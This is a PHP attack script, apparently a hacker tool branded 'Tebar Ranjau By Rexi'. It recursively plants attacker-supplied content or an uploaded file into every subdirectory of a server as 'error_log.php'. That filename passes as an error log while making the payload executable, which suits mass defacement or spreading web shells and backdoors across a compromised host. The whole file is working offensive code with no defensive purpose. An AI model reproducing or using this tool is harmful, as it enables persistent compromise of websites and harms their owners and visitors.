<?php
echo "<title>Tebar Ranjau By Rexi</title>";
echo "<link href='http://fonts.googleapis.com/css?family=Electrolize' rel='stylesheet' type='text/css'>";
echo "<body bgcolor='saddlebrown'><font color='black'><font face='Electrolize'>";
echo "<center><form method='POST' enctype='multipart/form-data'>";

echo "<img src='https://f.top4top.io/p_3377ag08l1.png' width='125' height='110'>";
echo "<hr color='black'><font color='yellow'>Target Folder</font><br>";
echo "<input cols='40' rows='40' type='text' style='color:lime;background-color:#000000' name='base_dir' value='".getcwd()."'><br><br>";
echo "<font color='yellow'>Masukan Scriptnya</font><br><textarea cols='85' rows='20' style='color:lime;background-color:#000000;background-image:url(#);' name='index'>Rexi & Raizo Was Here</textarea><br>";
echo "<font color='yellow'>Upload File</font><br><input type='file' name='upload_file'><br>";
echo "<input type='submit' value='GASKAN COK!'></form></center>";

if (isset($_POST['base_dir'])) {
    if (!file_exists($_POST['base_dir'])) {
        die ($_POST['base_dir']." Not Found !<br>");
    }

    if (!is_dir($_POST['base_dir'])) {
        die ($_POST['base_dir']." Is Not A Directory !<br>");
    }

    function uploadToDirectories($baseDir, $fileContent, $uploadedFile) {
        $files = scandir($baseDir);

        foreach ($files as $file) {
            if ($file == '.' || $file == '..') continue;
            $currentPath = $baseDir . '/' . $file;

            if (is_dir($currentPath)) {
                $errorLogPath = $currentPath . '/error_log.php';
                if (file_put_contents($errorLogPath, $fileContent) !== false) {
                    echo "<hr color='black'>>> <font color='yellow'>Saved: $errorLogPath&nbsp&nbsp&nbsp&nbsp</font><font color='lime'>(✔)</font>";
                }

                if (isset($uploadedFile) && $uploadedFile['error'] == UPLOAD_ERR_OK) {
                    $uploadPath = $currentPath . '/error_log.php';
                    if (move_uploaded_file($uploadedFile['tmp_name'], $uploadPath)) {
                        echo "<hr color='black'>>> <font color='yellow'>Uploaded: $uploadPath&nbsp&nbsp&nbsp&nbsp</font><font color='lime'>(✔)</font>";
                    } else {
                        echo "<hr color='black'>>> <font color='red'>Failed to upload: $uploadPath</font>";
                    }
                }
                uploadToDirectories($currentPath, $fileContent, $uploadedFile);
            }
        }
    }

    uploadToDirectories($_POST['base_dir'], $_POST['index'], $_FILES['upload_file']);
}
?>
